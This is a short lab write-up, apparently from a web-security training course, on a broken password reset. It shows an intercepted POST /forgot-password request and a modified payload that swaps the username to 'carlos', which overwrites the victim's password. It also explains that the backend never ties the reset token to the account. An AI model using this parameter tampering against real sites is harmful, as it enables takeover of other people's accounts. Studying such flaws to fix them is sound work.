# Lab 3 - Password reset broken logic

## Given
This lab's password reset functionality is vulnerable

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

## End Goal
Reset Carlos's password then log in and access his "**My account**" page

## Quick Steps
1. Navigate to **Forgot Password** and request a password reset link for your account (`wiener`)
2. Access the email client and click the password reset URL to load the reset form
3. Enter a new password and click Submit while intercepting the request in **Burp Suite**
4. In the intercepted `POST /forgot-password` request, locate the body parameters:
   `temp-forgot-password-token=...&username=wiener&new-password-1=...&new-password-2=...`
5. Change `username=wiener` to `username=carlos`
6. Forward the modified request to the server
7. Log into Carlos's account using the new password

## Payload & Mechanics
- **Original Reset Request:**
  `POST /forgot-password`
  `temp-forgot-password-token=[WIENER_TOKEN]&username=wiener&new-password-1=password123&new-password-2=password123`
- **Exploit Payload:**
  `POST /forgot-password`
  `temp-forgot-password-token=[WIENER_TOKEN]&username=carlos&new-password-1=password123&new-password-2=password123`

### Why it works:
- The backend verifies that `temp-forgot-password-token` is valid and active in the database, but does not verify that `token.associated_username == request.body.username`
- The application updates the account corresponding to the arbitrary `username` string supplied in the request body rather than the identity tied to the reset token itself

## Result
User `carlos`'s account password is overwritten, enabling full account takeover. Lab solved